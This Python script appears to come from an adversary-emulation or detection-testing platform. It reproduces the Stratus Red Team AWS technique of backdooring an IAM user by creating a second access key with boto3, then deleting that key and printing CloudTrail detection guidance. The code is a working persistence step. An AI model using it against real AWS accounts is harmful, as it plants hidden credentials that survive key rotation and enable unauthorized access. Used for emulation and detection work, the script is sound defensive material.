"""
Technique : aws.persistence.iam-backdoor-user
Tactic    : Persistence (T1098.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.iam-backdoor-user/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target IAM user.

How the attack works:
  An attacker with iam:CreateAccessKey can silently create a second set of
  programmatic credentials for any IAM user.  Even if the legitimate owner
  rotates their own key, the attacker's key continues to work.  The only
  CloudTrail evidence is a single iam:CreateAccessKey event on the target user
  from a different caller principal.

Detection signal:
  - iam:CreateAccessKey where requestParameters.userName != userIdentity.userName
    (i.e., the caller is not the user themselves creating their own key).

Revert:
  - Automated: ListAccessKeys + DeleteAccessKey in the finally block, targeting
    only the key created during this session.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Config ────────────────────────────────────────────────────────────────────

DWELL_TIME_S = 2


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir = str(Path(__file__).parent.parent / "infra")
    infra     = get_pulumi_outputs(stack_dir)
    user_name = infra.get("user_name", "stratus-red-team-backdoor-user-target")

    iam_client = session.client("iam")

    attacker_key_id: str | None = None

    try:
        # ── Step 1: Create backdoor access key ───────────────────────────────
        banner("Step 1 — Create backdoor access key (CreateAccessKey)")
        response = iam_client.create_access_key(UserName=user_name)
        attacker_key = response["AccessKey"]
        attacker_key_id = attacker_key["AccessKeyId"]

        print(f"  [+] Backdoor access key created for: {user_name}")
        print(f"  [+] AccessKeyId (attacker-controlled): {attacker_key_id}")
        print(f"  [!] CloudTrail event: iam:CreateAccessKey")
        print(f"  [!] Attacker now has persistent programmatic access as: {user_name}")
        print("  [!] Key survives rotation of the legitimate user's own key.")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert ────────────────────────────────────────────────────────────
        banner("Revert — Deleting attacker access key")
        if attacker_key_id:
            try:
                iam_client.delete_access_key(
                    UserName=user_name,
                    AccessKeyId=attacker_key_id,
                )
                print(f"  [+] Deleted key: {attacker_key_id}")
            except ClientError as exc:
                print(f"  [!] DeleteAccessKey failed: {exc}")
        else:
            print("  [~] No key to clean up.")

    banner("Complete")
    print("CloudTrail events: iam:CreateAccessKey, iam:DeleteAccessKey")
    print("\nDetection guidance:")
    print("  Alert when iam:CreateAccessKey userName != caller's own username.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the target user.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
